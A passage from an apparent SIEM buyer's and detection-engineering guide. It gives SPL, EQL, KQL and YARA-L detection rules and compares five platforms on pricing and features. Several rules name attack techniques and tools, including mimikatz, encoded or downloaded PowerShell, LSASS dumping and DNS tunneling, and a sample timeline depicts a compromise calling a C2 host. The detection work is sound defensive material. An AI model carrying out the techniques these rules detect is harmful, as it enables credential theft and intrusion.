| stats count as failed_attempts dc(TargetUserName) as unique_users
    earliest(_time) as first_attempt latest(_time) as last_attempt
    values(TargetUserName) as targeted_users by src_ip
| where failed_attempts > 50 AND unique_users > 5
| eval duration_minutes = round((last_attempt - first_attempt)/60, 2)
| where duration_minutes < 30
| sort -failed_attempts
| table src_ip failed_attempts unique_users duration_minutes targeted_users
```

**Brute Force Followed by Successful Login (Compromise Indicator)**
```spl
index=auth sourcetype=WinEventLog:Security (EventCode=4625 OR EventCode=4624)
| stats count(eval(EventCode=4625)) as failures
    count(eval(EventCode=4624)) as successes
    latest(eval(if(EventCode=4624, _time, null()))) as success_time
    earliest(eval(if(EventCode=4625, _time, null()))) as first_failure
    by src_ip TargetUserName
| where failures > 20 AND successes > 0
| eval time_to_success_min = round((success_time - first_failure)/60, 2)
| where time_to_success_min < 60
| table src_ip TargetUserName failures successes time_to_success_min
```

**Lateral Movement via Remote Services**
```spl
index=wineventlog sourcetype=WinEventLog:Security
    (EventCode=4624 Logon_Type=3) OR
    (EventCode=4648) OR
    (EventCode=5140 Share_Name="\\\\*\\C$") OR
    (EventCode=4698)
| eval activity=case(
    EventCode=4624, "Network_Logon",
    EventCode=4648, "Explicit_Credentials",
    EventCode=5140, "Admin_Share_Access",
    EventCode=4698, "Scheduled_Task_Created")
| stats dc(dest) as unique_destinations values(activity) as activities
    values(dest) as destinations count by src_ip Account_Name
| where unique_destinations > 3
| sort -unique_destinations
```

**Suspicious PowerShell Execution**
```spl
index=wineventlog sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
    EventCode=4104
| eval suspicious=if(
    match(ScriptBlockText, "(?i)(invoke-mimikatz|invoke-expression|downloadstring|
    encodedcommand|bypass|hidden|noprofile|invoke-webrequest|net\.webclient|
    reflection\.assembly|frombase64string|compress|decompress)"), 1, 0)
| where suspicious=1
| stats count values(ScriptBlockText) as scripts by Computer UserID
| table _time Computer UserID count scripts
```

**Data Exfiltration Detection (Unusually Large DNS Queries)**
```spl
index=network sourcetype=dns
| eval query_length=len(query)
| where query_length > 50
| stats count sum(query_length) as total_chars dc(query) as unique_queries by src_ip
| where count > 100 AND unique_queries > 50
| eval avg_length = round(total_chars/count, 1)
| where avg_length > 40
| sort -total_chars
| table src_ip count unique_queries avg_length total_chars
```

**Privilege Escalation Detection**
```spl
index=wineventlog sourcetype=WinEventLog:Security
    (EventCode=4672 OR EventCode=4728 OR EventCode=4732 OR EventCode=4756)
| eval action=case(
    EventCode=4672, "Special_Privileges_Assigned",
    EventCode=4728, "Added_to_Global_Security_Group",
    EventCode=4732, "Added_to_Local_Security_Group",
    EventCode=4756, "Added_to_Universal_Security_Group")
| stats count values(action) as actions values(TargetUserName) as targets
    by SubjectUserName src_ip
| where count > 3
| table _time SubjectUserName src_ip actions targets count
```

### Risk-Based Alerting (RBA)

RBA fundamentally changes how Splunk ES operates by shifting from individual alert-based detection to cumulative risk scoring per entity.

**Traditional Approach (Alert Fatigue)**
```
100 correlation searches --> 500+ notable events/day --> analyst burnout
```

**RBA Approach (Signal Aggregation)**
```
100 risk rules --> risk events in risk index --> aggregated per entity
--> Risk Notable only when threshold exceeded --> 10-20 actionable notables/day
```

**How RBA Works:**

1. **Risk Rules**: Narrowly-scoped correlation searches that generate risk events (not notable events)
2. **Risk Events**: Written to the `risk` index with: risk_score, risk_object (user/host/IP), risk_object_type, threat/mitre_technique
3. **Risk Index**: Central repository of all risk events across all entities
4. **Risk Notable**: Created when Risk Index Rule (RIR) detects threshold breach

**Risk Rule Example (Generates Risk Event, Not Notable)**
```spl
| tstats summariesonly=true count from datamodel=Authentication
    where Authentication.action=failure by Authentication.src Authentication.user
    _time span=5m
| rename Authentication.* as *
| where count > 10
| eval risk_score=40, risk_message="Multiple authentication failures from " . src
```

**Risk Index Rule (Generates Notable Event)**
```spl
| from datamodel:"Risk"."All_Risk"
| stats sum(risk_score) as total_risk
    dc(source) as unique_sources
    dc(risk_message) as unique_detections
    values(source) as detection_sources
    values(threat_object) as threat_objects
    latest(_time) as latest_risk_time
    by risk_object risk_object_type
| where total_risk > 100 OR
    (unique_sources > 3 AND total_risk > 50) OR
    unique_detections > 5
| eval urgency=case(
    total_risk > 200, "critical",
    total_risk > 100, "high",
    total_risk > 50, "medium",
    true(), "low")
```

**Dynamic Risk Factors:**
- Known admin accounts: risk_score * 0.5 (reduce noise)
- Service accounts on weekends: risk_score * 2.0 (amplify)
- Crown jewel servers: risk_score * 3.0 (amplify)
- Accounts from countries without operations: risk_score + 50 (add)

### Splunk ES Key Components

| Component | Description |
|-----------|-------------|
| **Notable Events** | Security-relevant incidents requiring investigation |
| **Correlation Searches** | Scheduled SPL searches that create notables or risk events |
| **Risk Index** | Centralized risk scoring per entity |
| **Adaptive Response Actions** | Automated actions: run script, send email, modify risk, create notable |
| **Investigation Workbench** | Entity-centric investigation with timeline |
| **Glass Tables** | Visual SOC dashboards with real-time metrics |
| **Data Models** | CIM-compliant accelerated data models (Authentication, Network Traffic, Endpoint, etc.) |
| **Content Packs** | Pre-built detections mapped to MITRE ATT&CK |

### Splunk Pricing Models (2025)

| Model | Unit | Best For | Considerations |
|-------|------|----------|----------------|
| **Ingest Pricing** | GB/day | Predictable data volumes | Cost grows linearly with data; overages expensive |
| **Workload Pricing (SVC)** | Splunk Virtual Compute units | Heavy search workloads | Decouples cost from ingest; complex capacity planning |
| **Entity Pricing** | Number of hosts | Observability-focused | Only for Observability Cloud products |

**Typical Costs (2025 estimates):**
- Splunk Cloud (ingest): $15-25/GB/day ingested
- Splunk Enterprise Security add-on: ~$30-60/GB/day additional
- Splunk SOAR: Separate pricing, typically $50K-200K+ annually
- Total cost for 100 GB/day: $500K-1.5M+ annually

**Cost Optimization Strategies:**
- Use summary indexing and data model acceleration
- Implement data tiering (hot/warm/cold/frozen to S3)
- Filter noise at ingest (null queue, heavy forwarder routing)
- Use metrics store for high-volume numeric data
- Leverage Federated Search for Splunk-to-Splunk or S3

---

## 3. Elastic Security

### Architecture Overview

Elastic Security runs on the Elastic Stack (Elasticsearch, Kibana, Fleet/Elastic Agent) and provides SIEM, endpoint protection, and cloud security capabilities in a unified platform.

```
+------------------+     +-------------------+     +-------------------+
| Data Collection  |---->| Elasticsearch     |---->| Kibana Security   |
| - Elastic Agent  |     | - Indexing (ECS)  |     | - Detection Rules |
| - Beats          |     | - Data Streams    |     | - Timeline        |
| - Logstash       |     | - ILM / DSL       |     | - Cases           |
| - Fleet Server   |     | - ML Nodes        |     | - Osquery         |
+------------------+     +-------------------+     +-------------------+
```

### Detection Rule Types

| Rule Type | Language | Use Case |
|-----------|----------|----------|
| **Custom Query** | KQL or Lucene | Simple field matching, threshold detection |
| **Event Correlation** | EQL | Multi-event sequences, stateful detection |
| **ES\|QL** | ES\|QL | Advanced analytical queries with aggregation |
| **Threshold** | KQL | Count-based detection over time windows |
| **Machine Learning** | Anomaly detection | Behavioral baselines, UEBA |
| **Indicator Match** | KQL + IoC list | Threat intelligence matching |
| **New Terms** | KQL | First-seen detection for processes, domains, users |

### EQL (Event Query Language) Examples

**Credential Dumping from LSASS**
```eql
process where event.type == "start" and
  process.name in ("procdump.exe", "procdump64.exe", "rundll32.exe") and
  process.args : "*lsass*"
```

**Sequence: Lateral Movement via Remote Service Creation**
```eql
sequence by host.name with maxspan=1m
  [authentication where event.outcome == "success" and
   winlog.logon.type == "Network" and
   source.ip != "127.0.0.1"]
  [process where event.type == "start" and
   process.parent.name == "services.exe" and
   process.name in ("cmd.exe", "powershell.exe", "mshta.exe")]
```

**Sequence: Suspicious File Download then Execution**
```eql
sequence by host.name with maxspan=5m
  [file where event.type == "creation" and
   file.extension in ("exe", "dll", "scr", "bat", "ps1") and
   (process.name == "chrome.exe" or process.name == "msedge.exe" or
    process.name == "firefox.exe" or process.name == "outlook.exe")]
  [process where event.type == "start" and
   process.executable : ("?:\\Users\\*\\Downloads\\*",
                          "?:\\Users\\*\\AppData\\Local\\Temp\\*")]
```

**Sequence: Privilege Escalation via Named Pipe Impersonation**
```eql
sequence by host.name with maxspan=30s
  [file where event.type == "creation" and file.name : "\\\\*\\pipe\\*"]
  [process where event.type == "start" and
   user.id == "S-1-5-18" and  /* SYSTEM */
   process.parent.name != "services.exe"]
```

**DNS Tunneling Detection**
```eql
dns where
  dns.question.name != null and
  length(dns.question.name) > 50 and
  dns.question.type in ("TXT", "NULL", "CNAME") and
  not dns.question.name : "*.microsoft.com" and
  not dns.question.name : "*.windows.com"
```

### Machine Learning Jobs

Elastic Security ships with pre-built ML jobs for anomaly detection:

| ML Job | Detection Goal | Data Source |
|--------|---------------|-------------|
| `v3_windows_anomalous_process_creation` | Unusual parent-child process relationships | Endpoint |
| `v3_windows_anomalous_script` | Rare script interpreters or arguments | Endpoint |
| `v3_linux_anomalous_network_activity` | Unusual network connections from processes | Network |
| `auth_rare_source_ip_for_a_user` | Login from unusual IP addresses | Authentication |
| `auth_high_count_logon_fails` | Brute force authentication | Authentication |
| `dns_tunneling` | DNS exfiltration patterns | DNS |
| `suspicious_login_activity` | Unusual login times/locations | Authentication |
| `rare_method_for_a_username` | Unusual API/HTTP methods per user | Web proxy |
| `high_count_network_events` | Network scanning or DDoS | Network |

### Timeline Investigation

Elastic Security's Timeline is an interactive investigation workspace:

```
+------------------------------------------------------+
|  Timeline: Investigation-2025-001                     |
|------------------------------------------------------|
| Filter: host.name: "webserver01" AND                 |
|         @timestamp >= "2025-03-15T08:00:00"          |
|------------------------------------------------------|
| 08:01:23 | process.start | powershell.exe -enc ...   |
| 08:01:45 | file.creation | C:\Temp\payload.exe       |
| 08:02:01 | process.start | payload.exe               |
| 08:02:15 | network.conn  | 185.141.x.x:443           |
| 08:03:30 | dns.query     | c2server.evil.com          |
| 08:04:12 | registry.mod  | HKLM\...\Run\persistence   |
| 08:05:00 | process.start | mimikatz.exe               |
|------------------------------------------------------|
| [Add to Case] [Create Rule] [Mark as Evidence]       |
+------------------------------------------------------+
```

### Elastic Security Pricing (2025)

| Tier | Deployment | Pricing Unit | SIEM Features |
|------|-----------|-------------|---------------|
| **Serverless Essentials** | Elastic Cloud Serverless | $/GB ingested + $/GB retained | Core SIEM, 400+ rules, ML jobs |
| **Serverless Complete** | Elastic Cloud Serverless | $/GB ingested + $/GB retained + $/endpoint | Full SIEM + EDR + Cloud Security |
| **Cloud Hosted** | Elastic Cloud | $/hour per resource | Full stack, self-managed sizing |
| **Self-Managed** | Customer infrastructure | License per node (Basic is free) | Basic SIEM free, Platinum/Enterprise for ML |

**Key pricing advantage**: The Elastic Basic license (free, self-managed) includes core SIEM capabilities including detection rules, timeline, and cases. ML anomaly detection requires Platinum or Enterprise license.

---

## 4. Microsoft Sentinel

### Architecture Overview

Microsoft Sentinel is a cloud-native SIEM and SOAR solution built on Azure Log Analytics, deeply integrated with the Microsoft security ecosystem.

```
+---------------------+     +--------------------+     +-------------------+
| Data Connectors     |---->| Log Analytics      |---->| Sentinel Engine   |
| - M365 Defender     |     | Workspace          |     | - Analytics Rules |
| - Entra ID          |     | - KQL Engine       |     | - UEBA            |
| - Azure Activity    |     | - Data Tables      |     | - Entity Pages    |
| - Syslog/CEF        |     | - ASIM Parsers     |     | - Threat Intel    |
| - Custom (API/AMA)  |     | - Retention Tiers  |     | - Hunting         |
+---------------------+     +--------------------+     +-------------------+
         |                                                       |
         |              +----------------------------------------+
         |              v
         |       +-----------------------+     +------------------+
         |       | Automation            |     | Defender Portal  |
         +------>| - Playbooks (Logic    |     | (Unified SecOps  |
                 |   Apps)               |     |  experience)     |
                 | - Automation Rules    |     |  2025+           |
                 +-----------------------+     +------------------+
```

### Analytics Rule Types

| Rule Type | Latency | Use Case |
|-----------|---------|----------|
| **Scheduled** | 5-min to 14-day lookback | Standard detection, KQL-based, most common |
| **NRT (Near-Real-Time)** | ~1 minute | High-priority detections, limited to 1-min lookback |
| **Fusion** | Varies | Multi-stage attack detection via ML correlation |
| **ML Behavior Analytics** | Varies | Anomaly detection based on learned baselines |
| **Threat Intelligence** | Near real-time | IoC matching against TI feeds |
| **Anomaly** | Varies | Built-in anomaly templates (customizable thresholds) |

### KQL (Kusto Query Language) Security Examples

**Brute Force Detection on Azure Entra ID**
```kql
SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType == "50126"  // Invalid username or password
| summarize
    FailedAttempts = count(),
    DistinctUsers = dcount(UserPrincipalName),
    TargetedUsers = make_set(UserPrincipalName, 10),
    TargetedApps = make_set(AppDisplayName, 5),
    FirstAttempt = min(TimeGenerated),
    LastAttempt = max(TimeGenerated)
    by IPAddress, Location = tostring(LocationDetails.city)
| where FailedAttempts > 25 and DistinctUsers > 3
| extend DurationMinutes = datetime_diff('minute', LastAttempt, FirstAttempt)
| where DurationMinutes < 30
| project IPAddress, Location, FailedAttempts, DistinctUsers,
    DurationMinutes, TargetedUsers, TargetedApps
| sort by FailedAttempts desc
```

**Brute Force Followed by Successful Login**
```kql
let FailedLogins = SigninLogs
    | where TimeGenerated > ago(1h)
    | where ResultType != "0"
    | summarize FailureCount = count() by IPAddress, UserPrincipalName;
let SuccessfulLogins = SigninLogs
    | where TimeGenerated > ago(1h)
    | where ResultType == "0"
    | project SuccessTime = TimeGenerated, IPAddress, UserPrincipalName,
        AppDisplayName, DeviceDetail;
FailedLogins
| where FailureCount > 10
| join kind=inner SuccessfulLogins on IPAddress, UserPrincipalName
| project UserPrincipalName, IPAddress, FailureCount, SuccessTime,
    AppDisplayName, DeviceDetail
| sort by FailureCount desc
```

**Suspicious Azure Resource Manager Operations**
```kql
AzureActivity
| where TimeGenerated > ago(24h)
| where OperationNameValue has_any (
    "Microsoft.Compute/virtualMachines/write",
    "Microsoft.Network/networkSecurityGroups/securityRules/write",
    "Microsoft.KeyVault/vaults/write",
    "Microsoft.Authorization/roleAssignments/write",
    "Microsoft.Storage/storageAccounts/listKeys/action")
| where ActivityStatusValue == "Success"
| summarize
    Operations = make_set(OperationNameValue, 20),
    OperationCount = count(),
    Resources = make_set(Resource, 10)
    by Caller, CallerIpAddress, SubscriptionId
| where OperationCount > 5
| sort by OperationCount desc
```

**Impossible Travel Detection**
```kql
SigninLogs
| where TimeGenerated > ago(7d)
| where ResultType == "0"
| extend City = tostring(LocationDetails.city),
    State = tostring(LocationDetails.state),
    Country = tostring(LocationDetails.countryOrRegion),
    Latitude = toreal(LocationDetails.geoCoordinates.latitude),
    Longitude = toreal(LocationDetails.geoCoordinates.longitude)
| project TimeGenerated, UserPrincipalName, IPAddress,
    City, Country, Latitude, Longitude
| sort by UserPrincipalName, TimeGenerated asc
| serialize
| extend PrevTime = prev(TimeGenerated, 1),
    PrevLat = prev(Latitude, 1),
    PrevLon = prev(Longitude, 1),
    PrevUser = prev(UserPrincipalName, 1),
    PrevCountry = prev(Country, 1)
| where UserPrincipalName == PrevUser
| extend TimeDiffHours = datetime_diff('hour', TimeGenerated, PrevTime)
| extend DistanceKm = geo_distance_2points(Longitude, Latitude, PrevLon, PrevLat) / 1000
| where TimeDiffHours > 0
| extend SpeedKmH = DistanceKm / TimeDiffHours
| where SpeedKmH > 900  // Faster than commercial aviation
| project TimeGenerated, UserPrincipalName, Country, PrevCountry,
    DistanceKm = round(DistanceKm), TimeDiffHours, SpeedKmH = round(SpeedKmH)
```

**Anomalous Key Vault Access**
```kql
AzureDiagnostics
| where ResourceProvider == "MICROSOFT.KEYVAULT"
| where TimeGenerated > ago(24h)
| where OperationName in ("SecretGet", "SecretList", "KeyGet",
    "KeyList", "CertificateGet", "CertificateList")
| summarize
    OperationCount = count(),
    UniqueSecrets = dcount(id_s),
    Operations = make_set(OperationName, 10)
    by CallerIPAddress, identity_claim_upn_s, ResourceId
| where OperationCount > 50 or UniqueSecrets > 10
| sort by OperationCount desc
```

**Multi-Stage Attack Detection (Manual Fusion)**
```kql
let SuspiciousSignins = SigninLogs
    | where TimeGenerated > ago(1h)
    | where RiskLevelDuringSignIn in ("high", "medium")
    | project SigninTime = TimeGenerated, UserPrincipalName, IPAddress, RiskLevel = RiskLevelDuringSignIn;
let PrivilegedActions = AzureActivity
    | where TimeGenerated > ago(1h)
    | where OperationNameValue has "roleAssignments/write"
    | project ActionTime = TimeGenerated, Caller, CallerIpAddress, OperationNameValue;
SuspiciousSignins
| join kind=inner (PrivilegedActions) on $left.UserPrincipalName == $right.Caller
| where ActionTime between (SigninTime .. (SigninTime + 1h))
| project SigninTime, ActionTime, UserPrincipalName, IPAddress,
    RiskLevel, OperationNameValue
```

### Sentinel UEBA (User and Entity Behavior Analytics)

UEBA enriches security data with behavioral context:

**Data Sources for UEBA:**
- Azure Entra ID: Sign-in logs, audit logs
- Azure Activity Logs
- Windows Security Events (via AMA)
- Office 365 audit logs
- Third-party syslog (via CEF)

**Key UEBA Tables:**
| Table | Content |
|-------|---------|
| `BehaviorAnalytics` | Anomalous activities with investigation priority scores |
| `IdentityInfo` | User profile enrichment (title, department, manager, group memberships) |
| `UserAccessAnalytics` | Access pattern baselines |
| `UserPeerAnalytics` | Peer group behavior comparison |

**UEBA Query Example**
```kql
BehaviorAnalytics
| where TimeGenerated > ago(24h)
| where ActivityInsights has "FirstTimeUser" or
    ActivityInsights has "FirstTimeConnection" or
    ActivityInsights has "AnomalousResource"
| where InvestigationPriority > 5
| project TimeGenerated, UserName, SourceIPAddress,
    ActivityType, ActivityInsights, InvestigationPriority,
    DevicesInsight, UsersInsight
| sort by InvestigationPriority desc
```

### Entity Pages

Entity pages provide a centralized investigation view per entity (user, host, IP, URL):

- **Alerts**: All alerts involving the entity
- **Anomalies**: UEBA-detected behavioral anomalies
- **Activity Timeline**: Chronological activity log
- **Related Entities**: Graph of connected entities
- **Bookmarks**: Analyst-added investigation notes
- **Insights**: Auto-generated behavioral summaries

### Sentinel Pricing (2025)

| Component | Pricing | Notes |
|-----------|---------|-------|
| **Analytics Logs (Pay-as-you-go)** | ~$2.76/GB ingested | Standard analysis tier |
| **Analytics Logs (Commitment)** | $1.50-2.30/GB (100-5000 GB/day tiers) | 31-day commitment |
| **Basic Logs** | ~$0.66/GB ingested | Limited queries, 8-day retention, no alerts |
| **Auxiliary Logs** | ~$0.11/GB ingested | Long-term, cold storage, limited queries |
| **Data Retention** | Free for 90 days, then $0.023/GB/month | Archive tier: $0.005/GB/month |
| **Playbook Execution** | Standard Logic Apps pricing | ~$0.000125/action |

**Free Data Sources (no Sentinel ingestion charge):**
- Azure Activity Logs
- Office 365 Audit Logs (SharePoint, Exchange, Teams activity)
- Alerts from Microsoft Defender products
- Azure Information Protection logs
- Microsoft Defender for IoT alerts

**Cost Optimization:**
- Use Basic Logs for high-volume, low-value data (NetFlow, DNS, debug logs)
- Use Auxiliary Logs for compliance/archive data
- Configure data collection rules (DCR) to filter at collection
- Leverage free data sources aggressively
- Use workspace transformation rules to drop or summarize before storage

### Defender Portal Integration (2025+)

Starting July 2025, new Sentinel customers are automatically onboarded to the unified Microsoft Defender portal. After March 31, 2027, Sentinel will only be available in the Defender portal (not the Azure portal).

Key changes:
- Unified incident queue across Defender XDR and Sentinel
- Single investigation experience
- Unified hunting across all data
- Automated attack disruption
- Unified RBAC model

---

## 5. Google Chronicle SIEM

### Architecture Overview

Google Chronicle SIEM (now Google Security Operations) is built on Google's infrastructure, offering massive-scale log ingestion with a per-employee pricing model.

```
+---------------------+     +--------------------+     +-------------------+
| Data Ingestion      |---->| UDM Normalization  |---->| Detection Engine  |
| - Forwarders        |     | - Parser Registry  |     | - YARA-L 2.0     |
| - Ingestion APIs    |     | - UDM Events       |     | - Curated Rules   |
| - Cloud Connectors  |     | - Entity Graph     |     | - Composite Rules |
| - SIEM Feeds        |     | - Reference Lists  |     | - Risk Scoring    |
+---------------------+     +--------------------+     +-------------------+
                                                               |
                              +--------------------------------+
                              v
                       +------------------+     +------------------+
                       | Investigation    |     | SOAR             |
                       | - Entity Pages   |     | - Playbooks      |
                       | - Search (UDM)   |     | - Case Mgmt      |
                       | - IOC Matching   |     | - Integrations   |
                       +------------------+     +------------------+
```

### UDM (Unified Data Model)

The UDM provides a strongly-typed schema for all security events:

```
UDM Event Structure:
+-- metadata
|   +-- event_type (NETWORK_CONNECTION, USER_LOGIN, PROCESS_LAUNCH, etc.)
|   +-- product_name, vendor_name
|   +-- event_timestamp
+-- principal (who initiated)
|   +-- hostname, ip, mac, user
+-- target (what was targeted)
|   +-- hostname, ip, port, url, process, file
+-- src / observer / intermediary
+-- network
|   +-- direction, application_protocol, session_id
+-- security_result
|   +-- severity, action, threat_name, category
+-- extensions
    +-- auth, vulns, additional fields
```

### YARA-L 2.0 Rules

**Rule Structure:**
```
rule rule_name {
  meta:
    author = "..."
    description = "..."
    severity = "..."
    mitre_attack_tactic = "..."
    mitre_attack_technique = "..."

  events:
    // Define event variables and conditions
    $event.metadata.event_type = "USER_LOGIN"

  match:
    // Group events by specific fields within a time window
    $event.principal.user.userid over 10m

  outcome:
    // Define output variables for alerts
    $risk_score = max(85)

  condition:
    // Threshold or logical conditions
    #event > 5
}
```

**Brute Force Detection**
```yara-l
rule brute_force_login_attempt {
  meta:
    author = "SOC Team"
    description = "Detects multiple failed logins followed by success"
    severity = "HIGH"
    mitre_attack_tactic = "Credential Access"
    mitre_attack_technique = "T1110"

  events:
    $fail.metadata.event_type = "USER_LOGIN"
    $fail.security_result.action = "BLOCK"
    $fail.principal.ip = $src_ip
    $fail.target.user.userid = $user

    $success.metadata.event_type = "USER_LOGIN"
    $success.security_result.action = "ALLOW"
    $success.principal.ip = $src_ip
    $success.target.user.userid = $user

    $success.metadata.event_timestamp.seconds >
        $fail.metadata.event_timestamp.seconds

  match:
    $src_ip, $user over 30m

  outcome:
    $risk_score = max(85)
    $failed_count = count_distinct($fail.metadata.id)
    $success_time = max($success.metadata.event_timestamp.seconds)

  condition:
    $fail and $success and #fail > 10
}
```

**Lateral Movement Detection**
```yara-l
rule lateral_movement_multiple_hosts {
  meta:
    author = "SOC Team"
    description = "Single source authenticating to many internal hosts"
    severity = "HIGH"
    mitre_attack_tactic = "Lateral Movement"
    mitre_attack_technique = "T1021"

  events:
    $login.metadata.event_type = "USER_LOGIN"
    $login.security_result.action = "ALLOW"
    $login.principal.ip = $src_ip
    $login.target.hostname = $dest_host
    $login.extensions.auth.type = "NETWORK"

    // Ensure internal-to-internal
    net.ip_in_range_cidr($login.principal.ip, "10.0.0.0/8")
    net.ip_in_range_cidr($login.target.ip, "10.0.0.0/8")

  match:
    $src_ip over 1h

  outcome:
    $risk_score = max(90)
    $unique_hosts = count_distinct($dest_host)
    $target_hosts = array_distinct($dest_host)

  condition:
    $login and $unique_hosts > 5
}
```

**Data Exfiltration via DNS**
```yara-l
rule dns_tunneling_exfiltration {
  meta:
    author = "SOC Team"
    description = "Detects potential DNS tunneling via long subdomain queries"
    severity = "MEDIUM"
    mitre_attack_tactic = "Exfiltration"
    mitre_attack_technique = "T1048.003"

  events:
    $dns.metadata.event_type = "NETWORK_DNS"
    $dns.network.dns.questions.name = $query
    $dns.principal.ip = $src_ip

    strings.length($query) > 50
    not re.regex($query, `.*\.(microsoft|google|amazonaws|azure)\.com$`)

    $dns.network.dns.questions.type = 16  // TXT record

  match:
    $src_ip over 15m

  outcome:
    $risk_score = max(70)
    $query_count = count_distinct($query)
    $sample_queries = array_distinct($query)

  condition:
    $dns and $query_count > 30
}
```

**Suspicious Service Account Usage**
```yara-l
rule service_account_interactive_login {
  meta:
    author = "SOC Team"
    description = "Service account used for interactive login"
    severity = "HIGH"

  events:
    $login.metadata.event_type = "USER_LOGIN"
    $login.security_result.action = "ALLOW"
    $login.target.user.userid = $user

    // Match service accounts by naming convention
    re.regex($user, `^(svc|srv|sa|service)[-_].*`)

    // Interactive login (not API/service-to-service)
    $login.extensions.auth.type = "INTERACTIVE"

  match:
    $user over 1h

  outcome:
    $risk_score = max(80)
    $source_ips = array_distinct($login.principal.ip)
    $login_count = count($login.metadata.id)

  condition:
    $login
}
```

### Curated Detections

Google-managed detection rule sets maintained by Google Cloud Threat Intelligence:

| Category | Coverage |
|----------|----------|
| **Cloud Threats** | GCP, AWS, Azure misconfigurations and attacks |
| **Windows Threats** | Endpoint detection mapped to MITRE ATT&CK |
| **Linux Threats** | Linux malware, persistence, privilege escalation |
| **Network Threats** | C2, tunneling, scanning, exfiltration |
| **Identity Threats** | Credential abuse, privilege escalation |
| **Chrome Enterprise Threats** | Browser extension threats (2025) |
| **Mandiant Intel** | Threat actor TTPs from Mandiant research |

### Chronicle Pricing

| Model | Description | Advantage |
|-------|-------------|-----------|
| **Per-employee** | Flat fee per employee | Unlimited data ingestion, predictable costs |
| **Per-GB ingestion** | Volume-based for non-employee scenarios | For MSSPs or unusual deployment patterns |

**Key advantage**: Chronicle's per-employee model means no penalty for ingesting more log sources, which is unique among enterprise SIEMs. A 10,000-employee organization pays the same whether ingesting 10 GB/day or 10 TB/day.

---

## 6. Sumo Logic Cloud SIEM

### Architecture Overview

Sumo Logic Cloud SIEM is a cloud-native security analytics platform with signal-based detection and entity-centric investigation.

### Signal Chaining and Insights

**Detection Flow:**
```
Raw Logs --> Rules (Match, Chain, Threshold, First Seen, Outlier)
         --> Signals (individual detections per entity)
         --> Insight (clustered signals exceeding threshold)
         --> Investigation / Cloud SOAR Response
```

**Signal Types:**
- **Match Rules**: Simple pattern matching (single event)
- **Chain Rules**: Multi-event correlation within time windows
- **Threshold Rules**: Count-based detection over time
- **First Seen Rules**: New/never-before-seen activity
- **Outlier Rules**: Statistical deviation from baselines

**Chain Rule Example (Multi-Stage Attack):**
```
Rule Expression 1: Failed authentication (count >= 5)
  AND
Rule Expression 2: Successful authentication (count >= 1)
  AND
Rule Expression 3: Privilege escalation event (count >= 1)
  Window: 30 minutes
  Entity: source IP address
```

### Entity Timelines

Each entity (user, IP, hostname) gets a timeline showing:
- All signals involving the entity
- Activity types and frequency
- Risk score progression
- Related entities (graph view)
- Historical baseline comparison

### Cloud SOAR Integration

Sumo Logic Cloud SOAR provides automated response:
- **Incident Management**: Automatic incident creation from Insights
- **Playbook Automation**: Visual playbook editor with 200+ integrations
- **War Room**: Real-time collaboration for incident response
- **Automated Triage**: Enrichment playbooks run automatically on new Insights

---

## 7. SIEM Platform Comparison Matrix

### Feature Comparison

| Feature | Splunk ES | Elastic Security | Microsoft Sentinel | Google Chronicle | Sumo Logic |
|---------|-----------|-----------------|-------------------|-----------------|------------|
| **Deployment** | Cloud / On-prem | Cloud / On-prem / Serverless | Cloud-only (Azure) | Cloud-only (Google) | Cloud-only |
| **Query Language** | SPL | KQL / EQL / ES\|QL | KQL | YARA-L 2.0 / UDM Search | Sumo Logic Query |
| **Data Model** | CIM | ECS | ASIM | UDM | Sumo CIM |
| **UEBA** | UBA (add-on) | ML anomaly jobs | Native UEBA | Entity risk scoring | Outlier rules |
| **SOAR** | Splunk SOAR (separate) | Cases + external | Playbooks (Logic Apps) | Chronicle SOAR | Cloud SOAR |
| **Threat Intel** | ES threat intel framework | Indicator match rules | TI connectors + Fusion | Mandiant + VirusTotal + GCTI | CrowdStrike + others |
| **ML/AI** | MLTK + Premium ML | Anomaly detection jobs | Fusion + anomaly rules | Curated detections | Outlier detection |
| **Pre-built Rules** | 1,400+ ES correlation searches | 1,000+ detection rules | 500+ analytics rule templates | Curated detection rule sets | 300+ rules |
| **MITRE Coverage** | Full ATT&CK mapping | Full ATT&CK mapping | Full ATT&CK mapping | Full ATT&CK mapping | Partial mapping |
| **Cloud Native** | Splunk Cloud | Elastic Cloud | Native Azure | Native Google | Native |
| **Multi-cloud** | Yes (add-ons) | Yes (Elastic Agent) | Yes (connectors) | Yes (forwarders) | Yes (collectors) |

### Pricing Model Comparison

| SIEM | Primary Model | Unit | Typical Cost (100 GB/day) | Cost Predictability |
|------|--------------|------|--------------------------|-------------------|
| **Splunk** | Ingest or Workload (SVC) | GB/day or SVC | $500K-1.5M/year | Low (overages common) |
| **Elastic** | Resource or Usage-based | GB/cloud resources | $200K-600K/year | Medium |
| **Sentinel** | Ingest (commitment tiers) | GB/day | $150K-400K/year | Medium (free sources help) |
| **Chronicle** | Per-employee | Employees | $150K-500K/year | High (unlimited data) |
| **Sumo Logic** | Credit-based | Credits | $200K-500K/year | Medium |

### Best Fit Scenarios

| Scenario | Best SIEM | Why |
|----------|-----------|-----|
| **Microsoft-heavy enterprise** | Sentinel | Free M365/Defender data, native Entra ID, KQL everywhere |
| **Google Cloud primary** | Chronicle | UDM, curated detections, per-employee unlimited ingest |
| **Large SOC, complex detection** | Splunk ES | SPL power, RBA maturity, largest ecosystem |
| **Open-source preferred / self-managed** | Elastic Security | Free tier, EQL sequences, self-host option |
| **High data volume, cost-sensitive** | Chronicle | Unlimited ingest model |
| **Integrated SIEM+SOAR** | Sumo Logic | Unified platform, signal chaining |
| **Compliance-heavy (PCI, HIPAA)** | Splunk ES | Most compliance content packs |
| **Multi-cloud / vendor-neutral** | Elastic or Splunk | Broadest connector ecosystems |

---

## 8. Open Source SIEM Alternatives

### Wazuh

**Overview**: Open-source security platform providing SIEM, XDR, and compliance capabilities.

**Architecture:**
```
+------------------+     +------------------+     +------------------+
| Wazuh Agents     |---->| Wazuh Manager    |---->| Wazuh Indexer    |
| (Endpoints)      |     | (Analysis)       |     | (OpenSearch)     |
|                  |     | - Rules Engine   |     |                  |
|                  |     | - Decoders       |     +------------------+
|                  |     | - SCA            |           |
+------------------+     +------------------+     +------------------+
                                                  | Wazuh Dashboard  |
                                                  | (OpenSearch Dash)|
                                                  +------------------+
```

**Key Capabilities:**
- Log analysis with 4,000+ default rules
- File integrity monitoring (FIM)
- Rootkit detection
- Vulnerability detection (CVE matching)
- Security Configuration Assessment (SCA/CIS benchmarks)
- Regulatory compliance (PCI-DSS, HIPAA, GDPR, NIST 800-53)
